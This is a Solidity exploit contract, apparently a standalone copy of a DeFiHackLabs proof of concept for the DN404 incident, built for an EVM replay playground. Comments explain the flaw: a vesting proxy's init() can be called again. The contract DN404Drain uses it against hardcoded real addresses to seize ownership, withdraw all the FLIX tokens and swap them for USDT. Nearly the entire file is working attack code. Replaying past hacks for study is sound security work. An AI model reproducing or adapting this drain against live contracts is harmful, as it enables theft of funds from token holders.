// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-02-DN404).
//
// The DeFiHackLabs PoC (test/DN404_exp.sol) runs the whole attack INLINE in
// the Foundry test contract itself: `attacker = address(this)`, and the
// Uniswap V3 flash-swap callback (`uniswapV3SwapCallback`) lives on the test
// contract. There is no standalone exploit contract to deploy. This file is
// a faithful, self-contained copy of that inline attack (init -> withdraw ->
// swap, plus the swap callback) so the playground can deploy it and record
// attack(). Logic and constants are copied verbatim from
// test/DN404_exp.sol::testExploit().
//
// Root cause: the LinearVesting implementation behind the TransparentUpgradeableProxy
// at 0x2c7112... exposes a PUBLIC, ungated `init(token, periods, interval)` that
// writes `owner = msg.sender` with no "already initialized" guard. Anyone can
// call init() again to become owner, then call the onlyOwner `withdraw(anyToken,
// amount, receiver)` to drain any token the proxy custodies -- here, 685,000 FLIX
// earmarked for vesting. The stolen FLIX is then dumped into the FLIX/USDT
// Uniswap V3 pool for ~169,577.74 USDT.

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
}

interface IProxy {
    function init(IERC20 initToken, uint256 initPeriods, uint256 initInterval) external;
    function withdraw(IERC20 otherToken, uint256 amount, address receiver) external;
}

interface IUniPairV3 {
    function swap(
        address recipient,
        bool zeroForOne,
        int256 amountSpecified,
        uint160 sqrtPriceLimitX96,
        bytes calldata data
    ) external returns (int256 amount0, int256 amount1);
}

contract DN404Drain {
    address constant VICTIM = 0x2c7112245Fc4af701EBf90399264a7e89205Dad4; // LinearVesting proxy
    address constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant FLIX = 0x83Cb9449b7077947a13Bf32025A8eAA3Fb1D8A5e;
    address constant UNIV3_PAIR = 0xa7434b755852F2555D6F96B9E28bAfE92F08Df97;

    // step 0-2: re-init the vesting proxy to seize ownership, drain its FLIX,
    // then dump the FLIX into the FLIX/USDT V3 pool via a swap.
    function attack() external {
        uint256 initPeriods = 1;
        uint256 initInterval = 1_000_000_000_000_000_000;
        uint256 amount = IERC20(FLIX).balanceOf(VICTIM);

        // step 1: public init() with no re-initialization guard -> attacker becomes owner.
        IProxy(VICTIM).init(IERC20(WETH), initPeriods, initInterval);

        // step 2: onlyOwner now passes for the attacker -> drain the entire FLIX reserve.
        IProxy(VICTIM).withdraw(IERC20(FLIX), amount, address(this));

        // step 3: dump the stolen FLIX into the V3 pool for USDT.
        IUniPairV3(UNIV3_PAIR).swap(address(this), true, int256(amount), 4_295_128_740, "");
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256, bytes memory) external {
        IERC20(FLIX).transfer(msg.sender, uint256(amount0Delta));
    }
}
